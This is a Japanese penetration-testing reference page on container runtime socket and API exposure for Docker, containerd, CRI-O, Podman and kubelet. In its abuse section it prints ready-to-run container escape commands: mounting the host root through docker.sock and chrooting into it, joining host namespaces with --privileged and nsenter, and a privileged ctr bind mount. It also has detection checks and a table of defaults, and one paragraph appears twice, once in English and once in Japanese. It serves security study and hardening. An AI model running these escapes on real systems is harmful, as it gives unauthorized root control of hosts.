# ランタイム API とデーモンの公開

{{#include ../../../banners/hacktricks-training.md}}

## 概要

多くの実際のコンテナ侵害は、名前空間の脱出から始まるわけではありません。ランタイムの制御プレーンへのアクセスから始まります。ワークロードがマウントされた Unix ソケットや公開された TCP リスナーを通じて `dockerd`, `containerd`, CRI-O, Podman, または kubelet と通信できる場合、攻撃者はより高い特権を持つ新しいコンテナを要求したり、ホストのファイルシステムをマウントしたり、ホストの名前空間に参加したり、機密なノード情報を取得したりできる可能性があります。こうした場合、ランタイム API が実際のセキュリティ境界であり、それを侵害することは機能的にホストの侵害に近いです。

このため、ランタイムソケットの公開はカーネル保護とは別に記録すべきです。通常の seccomp、capabilities、MAC confinement が適用されているコンテナであっても、`/var/run/docker.sock` や `/run/containerd/containerd.sock` が内部にマウントされていれば、ホスト侵害まで API 呼び出し一回の差しかない場合があります。現在のコンテナのカーネルによる隔離は設計どおりに機能している一方で、ランタイム管理プレーンが完全に公開されたままになっていることがあります。

## デーモンアクセスモデル

Docker Engine は従来、ローカルの Unix ソケット `unix:///var/run/docker.sock` 経由で特権 API を公開しています。歴史的には `tcp://0.0.0.0:2375` のような TCP リスナーや `2376` 上の TLS 保護されたリスナーを通じてリモート公開されることもありました。強力な TLS とクライアント認証なしにデーモンをリモート公開すると、Docker API は事実上リモート root インターフェイスになります。

containerd、CRI-O、Podman、kubelet も同様に影響の大きいインターフェイスを公開します。名前やワークフローは異なりますが、論理は同じです。インターフェイスが呼び出し元にワークロードの作成、ホストパスのマウント、認証情報の取得、実行中コンテナの変更を許すなら、そのインターフェイスは特権の管理チャネルであり、相応に扱うべきです。

確認すべき一般的なローカルパスは次のとおりです:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Older or more specialized stacks may also expose endpoints such as `dockershim.sock`, `frakti.sock`, or `rktlet.sock`. Those are less common in modern environments, but when encountered they should be treated with the same caution because they represent runtime-control surfaces rather than ordinary application sockets.

## Secure Remote Access

古い、あるいはより特殊なスタックでは、`dockershim.sock`、`frakti.sock`、`rktlet.sock` のようなエンドポイントを公開している場合もあります。これらは現代の環境ではあまり一般的ではありませんが、発見した場合は通常のアプリケーション用ソケットではなくランタイムを制御するインターフェースを表しているため、同じ注意を払うべきです。

ローカルソケット以外にデーモンを公開する必要がある場合、接続は TLS で保護し、可能であれば相互認証を行ってデーモンがクライアントを、クライアントがデーモンを相互に検証するようにしてください。利便性のために Docker デーモンを平文の HTTP で公開する古い習慣は、API が直接特権コンテナを作成できるほど強力であるため、コンテナ管理における最も危険なミスの一つです。

従来の Docker の設定パターンは次のようなものでした:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd ベースのホストでは、daemon の通信が `fd://` と表示されることがあり、これはプロセスが自分で直接バインドするのではなく systemd から事前にオープンされた socket を継承していることを意味します。重要なのは正確な構文ではなくセキュリティへの影響です。daemon が厳格に権限が制限されたローカル socket を超えてリッスンする時点で、transport security と client authentication はオプションの hardening ではなく必須になります。

## 悪用

runtime socket が存在する場合、どの socket か、互換性のあるクライアントが存在するか、raw HTTP または gRPC でのアクセスが可能かを確認してください:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
これらのコマンドは、dead path、mounted but inaccessible socket、そして live privileged API を区別できるため有用です。クライアントが成功した場合、次に確認すべきは、そのAPIが host bind mount や host namespace sharing を使って新しいコンテナを起動できるかどうかです。

### 完全な例: Docker Socket To Host Root

`docker.sock` が到達可能な場合、古典的なエスケープはホストのルートファイルシステムをマウントした新しいコンテナを起動し、そこに `chroot` することです:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
これは Docker daemon を通じてホストの root 権限での直接実行を可能にします。影響はファイルの読み取りだけにとどまりません。新しい container 内に侵入すると、攻撃者はホストのファイルを改変したり、credentials を収集したり、persistence を仕込んだり、追加の特権付き workloads を起動したりできます。

### 完全な例: Docker Socket To Host Namespaces

攻撃者がファイルシステムのみへのアクセスではなく namespace へのエントリを好む場合:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
この経路は、現在のコンテナを悪用するのではなく、ランタイムにホストの名前空間を明示的に露出する新しいコンテナを作成するよう要求することでホストに到達します。

### 完全な例: containerd ソケット

マウントされた `containerd` ソケットは通常同様に危険です:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
影響は再びホストの乗っ取りです。Docker固有のツールが存在しなくても、別のランタイムAPIが同等の管理権限を提供することがあります。

## チェック

これらのチェックの目的は、コンテナが本来信頼境界の外にあるべき管理プレーンに到達できるかどうかを確認することです。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
What is interesting here:

- マウントされたランタイムソケットは、単なる情報開示ではなく、通常は直接的な管理用プリミティブです。
- TLSなしで`2375`をリッスンしているTCPは、リモート侵害の状態として扱うべきです。
- `DOCKER_HOST` のような環境変数は、ワークロードが意図的にホストのランタイムと通信するよう設計されていることを示すことが多い。

## ランタイムのデフォルト

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでローカルUnixソケット | `dockerd`はローカルソケットでリッスンし、daemonは通常root権限で動作します | `/var/run/docker.sock` をマウント、`tcp://...:2375` を公開、`2376` のTLSが弱いまたは欠如 |
| Podman | デフォルトではデーモンレスなCLI | 通常のローカル利用では長期間稼働する特権デーモンは不要です；ただし `podman system service` が有効な場合はAPIソケットが露出することがあります | `podman.sock` を公開、サービスを広範囲に実行、root権限のAPI利用 |
| containerd | ローカルの特権ソケット | ローカルソケット経由で管理APIが公開され、通常は上位ツールによって利用されます | `containerd.sock` をマウント、広範な `ctr` や `nerdctl` アクセス、特権namespaceの公開 |
| CRI-O | ローカルの特権ソケット | CRIエンドポイントはノードローカルの信頼されたコンポーネント向けを意図しています | `crio.sock` をマウント、信頼されていないワークロードにCRIエンドポイントを公開する |
| Kubernetes kubelet | ノードローカルの管理API | KubeletはPodsから広く到達可能であってはならず；アクセスによってはauthn/authzに依存してpod状態、認証情報、実行機能が露出する可能性があります | kubeletソケットや証明書のマウント、弱いkubelet認証、ホストネットワーキングと到達可能なkubeletエンドポイントの組み合わせ |
{{#include ../../../banners/hacktricks-training.md}}
